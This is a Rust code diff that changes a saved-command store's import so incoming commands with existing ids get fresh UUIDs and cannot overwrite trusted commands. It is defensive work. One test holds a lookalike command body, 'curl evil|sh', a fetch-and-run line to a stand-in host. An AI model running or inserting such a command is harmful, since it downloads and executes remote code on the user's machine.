@@ -66,6 +66,13 @@ fn upsert_into(commands: &mut Vec<SavedCommand>, command: SavedCommand) {
     }
 }
 
+fn add_into(commands: &mut Vec<SavedCommand>, mut command: SavedCommand) {
+    if commands.iter().any(|c| c.id == command.id) {
+        command.id = Uuid::new_v4().to_string();
+    }
+    commands.push(command);
+}
+
 fn invalid(message: &str) -> AppError {
     AppError::Validation(message.to_string())
 }
@@ -116,7 +123,7 @@ impl CommandStore {
     }
 
     /// An empty id creates the command with a fresh UUID; a known id replaces
-    /// it in place; an unknown one creates it with that id (an import).
+    /// it in place; an unknown one creates it with that id.
     pub fn upsert(&self, command: SavedCommand) -> Result<SavedCommand, AppError> {
         let command = command.with_id();
         command.validate()?;
@@ -127,14 +134,15 @@ impl CommandStore {
         Ok(command)
     }
 
-    /// [`Self::upsert`] for many, validated first and saved in one write: all
-    /// or none. Returns the count saved.
-    pub fn upsert_all(&self, incoming: Vec<SavedCommand>) -> Result<usize, AppError> {
+    /// Adds many (an import), validated first and saved in one write: all or
+    /// none. An id already saved gets a fresh one: a shared file must never
+    /// change a command the user trusts under the same name. Returns the count.
+    pub fn add_all(&self, incoming: Vec<SavedCommand>) -> Result<usize, AppError> {
         let incoming: Vec<SavedCommand> = incoming.into_iter().map(SavedCommand::with_id).collect();
         incoming.iter().try_for_each(SavedCommand::validate)?;
         let count = incoming.len();
         self.mutate(|commands| {
-            incoming.into_iter().for_each(|c| upsert_into(commands, c));
+            incoming.into_iter().for_each(|c| add_into(commands, c));
             Ok(())
         })?;
         Ok(count)
@@ -222,18 +230,34 @@ mod tests {
     }
 
     #[test]
-    fn upsert_all_saves_every_command_in_one_write_or_none() {
+    fn add_all_saves_every_command_in_one_write_or_none() {
         let dir = tempdir().unwrap();
         let store = store_in(&dir);
         let saved = store
-            .upsert_all(vec![command("A", "a", true), command("B", "b", true)])
+            .add_all(vec![command("A", "a", true), command("B", "b", true)])
             .unwrap();
         assert_eq!(saved, 2);
         assert!(saved_ids_are_unique(&store));
 
         let bad = vec![command("C", "c", true), command("", "x", true)];
-        assert!(store.upsert_all(bad).is_err());
+        assert!(store.add_all(bad).is_err());
         assert_eq!(store.list().len(), 2);
+    }
+
+    #[test]
+    fn add_all_never_replaces_a_saved_command_with_the_same_id() {
+        let dir = tempdir().unwrap();
+        let store = store_in(&dir);
+        let saved = store.upsert(command("Uptime", "uptime", true)).unwrap();
+        let mut lookalike = command("Uptime", "uptime\ncurl evil|sh", true);
+        lookalike.id = saved.id.clone();
+
+        store.add_all(vec![lookalike.clone(), lookalike]).unwrap();
+
+        let list = store.list();
+        assert_eq!(list.len(), 3);
+        assert_eq!(list[0], saved);
+        assert!(saved_ids_are_unique(&store));
     }
 
     fn saved_ids_are_unique(store: &CommandStore) -> bool {
